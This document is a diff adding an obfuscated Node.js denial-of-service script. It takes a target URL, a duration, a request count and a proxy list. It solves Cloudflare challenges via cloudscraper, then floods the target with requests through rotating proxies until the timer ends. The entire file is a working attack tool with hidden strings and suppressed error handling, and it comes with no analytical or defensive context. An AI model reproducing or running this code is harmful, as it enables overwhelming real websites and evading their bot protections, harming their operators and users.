@@ -1,0 +1,156 @@
+const _0x135e = [
+    'argv',
+    'y\x0anode\x20',
+    '1LanBLo',
+    'headers',
+    '54311svYZjs',
+    'cloudscrap',
+    '1lSGZfH',
+    'yfwfD',
+    'oOqyq',
+    'ample.com\x20',
+    '1793ktEWYx',
+    'filter',
+    'request',
+    '9vDQRJZ',
+    'EventEmitt',
+    'PKwDu',
+    'ANINE',
+    'events',
+    'ejection',
+    '151WGVcPQ',
+    '\x20http://ex',
+    'http://',
+    'replace',
+    '1djFJbh',
+    'then',
+    'Attack\x20end',
+    '1AUDBtP',
+    'indexOf',
+    '22889XHtQQc',
+    'basename',
+    'path',
+    '2NmwZEV',
+    'unhandledR',
+    '63197iHfKyV',
+    'utf-8',
+    'message',
+    'rkNKd',
+    'floor',
+    'tsrZe',
+    '.txt',
+    '9529sayRRG',
+    'oxtYd',
+    'defaultMax',
+    'Listeners',
+    '\x0anode\x20',
+    'log',
+    'NGBoC',
+    '1tSHYMN',
+    'exit',
+    'random',
+    'ception',
+    'uncaughtEx',
+    'tEVPa',
+    '60\x2064\x20http',
+    'requests\x20p',
+    'readFileSy',
+    '248669FAVsjI',
+    'ZeprT',
+    'length',
+    'splice',
+    'split',
+    'er\x20ip\x20prox',
+    '\x20url\x20time\x20',
+    'Code\x20By\x20AK'
+];
+const _0x51828a = _0x350b;
+(function (_0x591c92, _0x25a02b) {
+    const _0x7c333d = _0x350b;
+    while (!![]) {
+        try {
+            const _0x2c48b5 = parseInt(_0x7c333d(0xac)) * -parseInt(_0x7c333d(0xa7)) + parseInt(_0x7c333d(0xc8)) * parseInt(_0x7c333d(0xaa)) + -parseInt(_0x7c333d(0xb1)) * parseInt(_0x7c333d(0xbf)) + -parseInt(_0x7c333d(0xda)) * -parseInt(_0x7c333d(0xdd)) + -parseInt(_0x7c333d(0xaf)) * -parseInt(_0x7c333d(0xa3)) + -parseInt(_0x7c333d(0xd2)) * parseInt(_0x7c333d(0xd4)) + -parseInt(_0x7c333d(0xd6)) * -parseInt(_0x7c333d(0xb8));
+            if (_0x2c48b5 === _0x25a02b)
+                break;
+            else
+                _0x591c92['push'](_0x591c92['shift']());
+        } catch (_0x3f2df5) {
+            _0x591c92['push'](_0x591c92['shift']());
+        }
+    }
+}(_0x135e, -0x3bb89 + -0x3f01 * 0x5 + -0x2 * -0x38177), require(_0x51828a(0xa1))[_0x51828a(0xde) + 'er'][_0x51828a(0xba) + _0x51828a(0xbb)] = 0x25 * 0x105 + 0x1 * 0x13ba + -0x3973);
+const fs = require('fs'), CloudScraper = require(_0x51828a(0xd5) + 'er'), path = require(_0x51828a(0xae));
+function _0x350b(_0x5ca20b, _0x532226) {
+    _0x5ca20b = _0x5ca20b - (-0x27a + -0xbd0 + 0x43 * 0x39);
+    let _0x43e619 = _0x135e[_0x5ca20b];
+    return _0x43e619;
+}
+process[_0x51828a(0xd0)][_0x51828a(0xca)] !== 0x1098 + -0x18ab + 0x819 && (console[_0x51828a(0xbd)](_0x51828a(0xbc) + path[_0x51828a(0xad)](__filename) + (_0x51828a(0xce) + _0x51828a(0xc6) + _0x51828a(0xcd) + _0x51828a(0xd1)) + path[_0x51828a(0xad)](__filename) + (_0x51828a(0xa4) + _0x51828a(0xd9) + _0x51828a(0xc5) + _0x51828a(0xb7))), console[_0x51828a(0xbd)](_0x51828a(0xcf) + _0x51828a(0xe0)), process[_0x51828a(0xc0)](-0x4ba + -0x115 + 0x5cf));
+const target = process[_0x51828a(0xd0)][-0x1 * 0x24a3 + -0x22da + 0x477f], time = process[_0x51828a(0xd0)][0x1cb0 + -0x1805 + 0x1 * -0x4a8], req_per_ip = process[_0x51828a(0xd0)][0x14f0 + -0x1a23 * 0x1 + 0x537];
+let proxies = fs[_0x51828a(0xc7) + 'nc'](process[_0x51828a(0xd0)][-0x127 * 0x11 + -0x2459 + 0x37f5], _0x51828a(0xb2))[_0x51828a(0xa6)](/\r/gi, '')[_0x51828a(0xcc)]('\x0a')[_0x51828a(0xdb)](Boolean);
+function send_req() {
+    const _0xfc2a8a = _0x51828a, _0x266ee1 = {
+            'ZeprT': function (_0x56cd2d, _0x5589db) {
+                return _0x56cd2d(_0x5589db);
+            },
+            'tEVPa': function (_0x40accf, _0x14852e, _0x41f6d6) {
+                return _0x40accf(_0x14852e, _0x41f6d6);
+            },
+            'PKwDu': function (_0x27dc5d, _0x18f068) {
+                return _0x27dc5d + _0x18f068;
+            },
+            'rkNKd': _0xfc2a8a(0xa5),
+            'tsrZe': function (_0x256ee0, _0x171264) {
+                return _0x256ee0 < _0x171264;
+            },
+            'yfwfD': function (_0x2a73bd, _0x74b78, _0x21b57c) {
+                return _0x2a73bd(_0x74b78, _0x21b57c);
+            },
+            'oOqyq': function (_0x2dc112, _0x31bbbf) {
+                return _0x2dc112 * _0x31bbbf;
+            }
+        };
+    let _0x52eea5 = proxies[Math[_0xfc2a8a(0xb5)](_0x266ee1[_0xfc2a8a(0xd8)](Math[_0xfc2a8a(0xc1)](), proxies[_0xfc2a8a(0xca)]))], _0xfb2c2 = new Promise(function (_0x21db76, _0x42c8e1) {
+            const _0x5e32f6 = _0xfc2a8a;
+            _0x266ee1[_0x5e32f6(0xc4)](CloudScraper, {
+                'uri': target,
+                'resolveWithFullResponse': !![],
+                'proxy': _0x266ee1[_0x5e32f6(0xdf)](_0x266ee1[_0x5e32f6(0xb4)], _0x52eea5),
+                'challengesToSolve': 0xa
+            }, function (_0x1bf70, _0x48ce28) {
+                const _0x3a40a6 = _0x5e32f6;
+                if (_0x1bf70) {
+                    let _0x417141 = proxies[_0x3a40a6(0xab)](_0x52eea5);
+                    return proxies[_0x3a40a6(0xcb)](_0x417141, -0x24df + 0x15 * -0x133 + 0x3e0f * 0x1), console[_0x3a40a6(0xbd)](_0x1bf70[_0x3a40a6(0xb3)]);
+                }
+                _0x266ee1[_0x3a40a6(0xc9)](_0x21db76, _0x48ce28[_0x3a40a6(0xdc)][_0x3a40a6(0xd3)]);
+            });
+        });
+    _0xfb2c2[_0xfc2a8a(0xa8)](function (_0x38cce1) {
+        const _0x561d0d = _0xfc2a8a;
+        for (let _0x4688f2 = 0x17cd + 0xe7e + -0x264b * 0x1; _0x266ee1[_0x561d0d(0xb6)](_0x4688f2, req_per_ip); ++_0x4688f2) {
+            _0x266ee1[_0x561d0d(0xd7)](CloudScraper, {
+                'uri': target,
+                'headers': _0x38cce1,
+                'proxy': _0x266ee1[_0x561d0d(0xdf)](_0x266ee1[_0x561d0d(0xb4)], _0x52eea5),
+                'followAllRedirects': ![]
+            }, function (_0x52d72a, _0x64d081) {
+                const _0xbeac6d = _0x561d0d;
+                _0x52d72a && console[_0xbeac6d(0xbd)](_0x52d72a[_0xbeac6d(0xb3)]);
+            });
+        }
+    });
+}
+setInterval(() => {
+    const _0xf59984 = _0x51828a, _0x3a68b9 = {
+            'NGBoC': function (_0x56e223) {
+                return _0x56e223();
+            }
+        };
+    _0x3a68b9[_0xf59984(0xbe)](send_req);
+}), setTimeout(() => {
+    const _0x42219 = _0x51828a, _0xd7863d = { 'oxtYd': _0x42219(0xa9) };
+    console[_0x42219(0xbd)](_0xd7863d[_0x42219(0xb9)]), process[_0x42219(0xc0)](0x20fe + 0x21a9 + -0x42a7);
+}, time * (-0xbd8 + -0x1d2f + -0x2cef * -0x1)), process['on'](_0x51828a(0xc3) + _0x51828a(0xc2), function (_0x1dc8de) {
+}), process['on'](_0x51828a(0xb0) + _0x51828a(0xa2), function (_0x209f3f) {
+});
